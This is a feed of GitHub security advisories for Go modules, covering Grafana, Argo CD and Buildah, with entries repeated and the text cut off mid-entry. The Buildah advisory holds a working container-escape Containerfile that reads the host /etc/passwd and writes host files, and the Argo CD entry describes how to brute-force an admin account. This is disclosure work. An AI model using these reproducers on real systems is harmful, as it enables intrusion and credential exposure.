{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<p>It is possible for a user in a different organization from the owner of a snapshot to bypass authorization and delete a snapshot by issuing a <code>DELETE</code> request to <code>/api/snapshots/&lt;key&gt;</code> using its view key. This functionality is intended to only be available to individuals with the permission to write/edit to the snapshot in question, but due to a bug in the authorization logic, deletion requests issued by an unprivileged user in a different organization than the snapshot owner are treated as authorized.</p>\n<p>Grafana Labs would like to thank Ravid Mazon and Jay Chen of Palo Alto Research for discovering and disclosing this vulnerability.</p>\n<p>This issue affects Grafana: from 9.5.0 before 9.5.18, from 10.0.0 before 10.0.13, from 10.1.0 before 10.1.9, from 10.2.0 before 10.2.6, from 10.3.0 before 10.3.5.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1313\">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2024-1313\">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mh7p-8m2f-qrm6\">https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mh7p-8m2f-qrm6",
            "title": "[github.com/grafana/grafana] Grafana vulnerable to authorization bypass",
            "date_modified": "2024-03-27T02:01:47.000Z",
            "date_published": "2024-03-26T18:32:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mh7p-8m2f-qrm6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>It is possible for a user in a different organization from the owner of a snapshot to bypass authorization and delete a snapshot by issuing a <code>DELETE</code> request to <code>/api/snapshots/&lt;key&gt;</code> using its view key. This functionality is intended to only be available to individuals with the permission to write/edit to the snapshot in question, but due to a bug in the authorization logic, deletion requests issued by an unprivileged user in a different organization than the snapshot owner are treated as authorized.</p>\n<p>Grafana Labs would like to thank Ravid Mazon and Jay Chen of Palo Alto Research for discovering and disclosing this vulnerability.</p>\n<p>This issue affects Grafana: from 9.5.0 before 9.5.18, from 10.0.0 before 10.0.13, from 10.1.0 before 10.1.9, from 10.2.0 before 10.2.6, from 10.3.0 before 10.3.5.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1313\">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2024-1313\">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mh7p-8m2f-qrm6\">https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mh7p-8m2f-qrm6",
            "title": "[github.com/grafana/grafana] Grafana vulnerable to authorization bypass",
            "date_modified": "2024-03-27T02:01:47.000Z",
            "date_published": "2024-03-26T18:32:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mh7p-8m2f-qrm6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>It is possible for a user in a different organization from the owner of a snapshot to bypass authorization and delete a snapshot by issuing a <code>DELETE</code> request to <code>/api/snapshots/&lt;key&gt;</code> using its view key. This functionality is intended to only be available to individuals with the permission to write/edit to the snapshot in question, but due to a bug in the authorization logic, deletion requests issued by an unprivileged user in a different organization than the snapshot owner are treated as authorized.</p>\n<p>Grafana Labs would like to thank Ravid Mazon and Jay Chen of Palo Alto Research for discovering and disclosing this vulnerability.</p>\n<p>This issue affects Grafana: from 9.5.0 before 9.5.18, from 10.0.0 before 10.0.13, from 10.1.0 before 10.1.9, from 10.2.0 before 10.2.6, from 10.3.0 before 10.3.5.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1313\">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2024-1313\">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mh7p-8m2f-qrm6\">https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mh7p-8m2f-qrm6",
            "title": "[github.com/grafana/grafana] Grafana vulnerable to authorization bypass",
            "date_modified": "2024-03-27T02:01:47.000Z",
            "date_published": "2024-03-26T18:32:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mh7p-8m2f-qrm6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>It is possible for a user in a different organization from the owner of a snapshot to bypass authorization and delete a snapshot by issuing a <code>DELETE</code> request to <code>/api/snapshots/&lt;key&gt;</code> using its view key. This functionality is intended to only be available to individuals with the permission to write/edit to the snapshot in question, but due to a bug in the authorization logic, deletion requests issued by an unprivileged user in a different organization than the snapshot owner are treated as authorized.</p>\n<p>Grafana Labs would like to thank Ravid Mazon and Jay Chen of Palo Alto Research for discovering and disclosing this vulnerability.</p>\n<p>This issue affects Grafana: from 9.5.0 before 9.5.18, from 10.0.0 before 10.0.13, from 10.1.0 before 10.1.9, from 10.2.0 before 10.2.6, from 10.3.0 before 10.3.5.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1313\">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2024-1313\">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mh7p-8m2f-qrm6\">https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mh7p-8m2f-qrm6",
            "title": "[github.com/grafana/grafana] Grafana vulnerable to authorization bypass",
            "date_modified": "2024-03-27T02:01:47.000Z",
            "date_published": "2024-03-26T18:32:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mh7p-8m2f-qrm6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>It is possible for a user in a different organization from the owner of a snapshot to bypass authorization and delete a snapshot by issuing a <code>DELETE</code> request to <code>/api/snapshots/&lt;key&gt;</code> using its view key. This functionality is intended to only be available to individuals with the permission to write/edit to the snapshot in question, but due to a bug in the authorization logic, deletion requests issued by an unprivileged user in a different organization than the snapshot owner are treated as authorized.</p>\n<p>Grafana Labs would like to thank Ravid Mazon and Jay Chen of Palo Alto Research for discovering and disclosing this vulnerability.</p>\n<p>This issue affects Grafana: from 9.5.0 before 9.5.18, from 10.0.0 before 10.0.13, from 10.1.0 before 10.1.9, from 10.2.0 before 10.2.6, from 10.3.0 before 10.3.5.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1313\">https://nvd.nist.gov/vuln/detail/CVE-2024-1313</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2024-1313\">https://grafana.com/security/security-advisories/cve-2024-1313</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mh7p-8m2f-qrm6\">https://github.com/advisories/GHSA-mh7p-8m2f-qrm6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mh7p-8m2f-qrm6",
            "title": "[github.com/grafana/grafana] Grafana vulnerable to authorization bypass",
            "date_modified": "2024-03-27T02:01:47.000Z",
            "date_published": "2024-03-26T18:32:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mh7p-8m2f-qrm6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An attacker can effectively bypass the rate limit and brute force protections by exploiting the application's weak cache-based mechanism. This loophole in security can be combined with other vulnerabilities to attack the default admin account. This flaw undermines a previously <a href=\"https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force\">patched CVE</a> intended to protect against brute-force attacks.</p>\n<h3 id=\"details\">Details</h3>\n<p>The application's brute force protection relies on a cache mechanism that tracks login attempts for each user. This cache is limited to a <code>defaultMaxCacheSize</code> of 1000 entries. An attacker can overflow this cache by bombarding it with login attempts for different users, thereby pushing out the admin account's failed attempts and effectively resetting the rate limit for that account.</p>\n<p>The brute force protection mechanism's code:</p>\n<pre><code class=\"language-go\">   if failed &amp;&amp; len(failures) &gt;= getMaximumCacheSize() {\n       log.Warnf(\"Session cache size exceeds %d entries, removing random entry\",\n\ngetMaximumCacheSize())\n       idx := rand.Intn(len(failures) - 1)\n       var rmUser string\n       i := 0\n       for key := range failures {\n\n           if i == idx {\n               rmUser = key\n\n               delete(failures, key)\n\nbreak\n\n}\n\ni++ }\n\n       log.Infof(\"Deleted entry for user %s from cache\", rmUser)\n   }\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Set up the application environment and identify the login page.</li>\n<li>Execute 4 failed login attempts for the admin account.</li>\n<li>Run a Burp Intruder attack to populate the cache with login attempts for usernames ranging from 1 to 10000.</li>\n<li>After 1000 attempts, start monitoring to see if the admin entries in the cache have been cleared.</li>\n<li>At this point, brute-force the admin account.</li>\n</ol>\n<p>In just 15 minutes, the PoC was able to perform 230 brute force attempts on the admin account. This rate allows for approximately 1000 requests per hour, effectively rendering the <a href=\"https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force\">older CVE</a> rate limit patches useless.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a severe vulnerability that enables attackers to perform brute force attacks at an accelerated rate, especially targeting the default admin account.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21662\">https://nvd.nist.gov/vuln/detail/CVE-2024-21662</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d\">https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b\">https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456\">https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456</a></li>\n<li><a href=\"https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force\">https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2vgg-9h6w-m454\">https://github.com/advisories/GHSA-2vgg-9h6w-m454</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2vgg-9h6w-m454",
            "title": "[github.com/argoproj/argo-cd/v2] Bypassing Rate Limit and Brute Force Protection Using Cache Overflow",
            "date_modified": "2024-03-22T20:05:15.000Z",
            "date_published": "2024-03-18T20:29:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2vgg-9h6w-m454"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An attacker can effectively bypass the rate limit and brute force protections by exploiting the application's weak cache-based mechanism. This loophole in security can be combined with other vulnerabilities to attack the default admin account. This flaw undermines a previously <a href=\"https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force\">patched CVE</a> intended to protect against brute-force attacks.</p>\n<h3 id=\"details\">Details</h3>\n<p>The application's brute force protection relies on a cache mechanism that tracks login attempts for each user. This cache is limited to a <code>defaultMaxCacheSize</code> of 1000 entries. An attacker can overflow this cache by bombarding it with login attempts for different users, thereby pushing out the admin account's failed attempts and effectively resetting the rate limit for that account.</p>\n<p>The brute force protection mechanism's code:</p>\n<pre><code class=\"language-go\">   if failed &amp;&amp; len(failures) &gt;= getMaximumCacheSize() {\n       log.Warnf(\"Session cache size exceeds %d entries, removing random entry\",\n\ngetMaximumCacheSize())\n       idx := rand.Intn(len(failures) - 1)\n       var rmUser string\n       i := 0\n       for key := range failures {\n\n           if i == idx {\n               rmUser = key\n\n               delete(failures, key)\n\nbreak\n\n}\n\ni++ }\n\n       log.Infof(\"Deleted entry for user %s from cache\", rmUser)\n   }\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Set up the application environment and identify the login page.</li>\n<li>Execute 4 failed login attempts for the admin account.</li>\n<li>Run a Burp Intruder attack to populate the cache with login attempts for usernames ranging from 1 to 10000.</li>\n<li>After 1000 attempts, start monitoring to see if the admin entries in the cache have been cleared.</li>\n<li>At this point, brute-force the admin account.</li>\n</ol>\n<p>In just 15 minutes, the PoC was able to perform 230 brute force attempts on the admin account. This rate allows for approximately 1000 requests per hour, effectively rendering the <a href=\"https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force\">older CVE</a> rate limit patches useless.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a severe vulnerability that enables attackers to perform brute force attacks at an accelerated rate, especially targeting the default admin account.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21662\">https://nvd.nist.gov/vuln/detail/CVE-2024-21662</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d\">https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b\">https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456\">https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456</a></li>\n<li><a href=\"https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force\">https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2vgg-9h6w-m454\">https://github.com/advisories/GHSA-2vgg-9h6w-m454</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2vgg-9h6w-m454",
            "title": "[github.com/argoproj/argo-cd/v2] Bypassing Rate Limit and Brute Force Protection Using Cache Overflow",
            "date_modified": "2024-03-22T20:05:15.000Z",
            "date_published": "2024-03-18T20:29:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2vgg-9h6w-m454"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An attacker can effectively bypass the rate limit and brute force protections by exploiting the application's weak cache-based mechanism. This loophole in security can be combined with other vulnerabilities to attack the default admin account. This flaw undermines a previously <a href=\"https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force\">patched CVE</a> intended to protect against brute-force attacks.</p>\n<h3 id=\"details\">Details</h3>\n<p>The application's brute force protection relies on a cache mechanism that tracks login attempts for each user. This cache is limited to a <code>defaultMaxCacheSize</code> of 1000 entries. An attacker can overflow this cache by bombarding it with login attempts for different users, thereby pushing out the admin account's failed attempts and effectively resetting the rate limit for that account.</p>\n<p>The brute force protection mechanism's code:</p>\n<pre><code class=\"language-go\">   if failed &amp;&amp; len(failures) &gt;= getMaximumCacheSize() {\n       log.Warnf(\"Session cache size exceeds %d entries, removing random entry\",\n\ngetMaximumCacheSize())\n       idx := rand.Intn(len(failures) - 1)\n       var rmUser string\n       i := 0\n       for key := range failures {\n\n           if i == idx {\n               rmUser = key\n\n               delete(failures, key)\n\nbreak\n\n}\n\ni++ }\n\n       log.Infof(\"Deleted entry for user %s from cache\", rmUser)\n   }\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Set up the application environment and identify the login page.</li>\n<li>Execute 4 failed login attempts for the admin account.</li>\n<li>Run a Burp Intruder attack to populate the cache with login attempts for usernames ranging from 1 to 10000.</li>\n<li>After 1000 attempts, start monitoring to see if the admin entries in the cache have been cleared.</li>\n<li>At this point, brute-force the admin account.</li>\n</ol>\n<p>In just 15 minutes, the PoC was able to perform 230 brute force attempts on the admin account. This rate allows for approximately 1000 requests per hour, effectively rendering the <a href=\"https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force\">older CVE</a> rate limit patches useless.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a severe vulnerability that enables attackers to perform brute force attacks at an accelerated rate, especially targeting the default admin account.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2vgg-9h6w-m454</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21662\">https://nvd.nist.gov/vuln/detail/CVE-2024-21662</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d\">https://github.com/argoproj/argo-cd/commit/17b0df1168a4c535f6f37e95f25ed7cd81e1fa4d</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b\">https://github.com/argoproj/argo-cd/commit/6e181d72b31522f886a2afa029d5b26d7912ec7b</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456\">https://github.com/argoproj/argo-cd/commit/cebb6538f7944c87ca2fecb5d17f8baacc431456</a></li>\n<li><a href=\"https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force\">https://argo-cd.readthedocs.io/en/stable/security_considerations/#cve-2020-8827-insufficient-anti-automationanti-brute-force</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2vgg-9h6w-m454\">https://github.com/advisories/GHSA-2vgg-9h6w-m454</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2vgg-9h6w-m454",
            "title": "[github.com/argoproj/argo-cd/v2] Bypassing Rate Limit and Brute Force Protection Using Cache Overflow",
            "date_modified": "2024-03-22T20:05:15.000Z",
            "date_published": "2024-03-18T20:29:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2vgg-9h6w-m454"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-03-22T20:04:04.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the 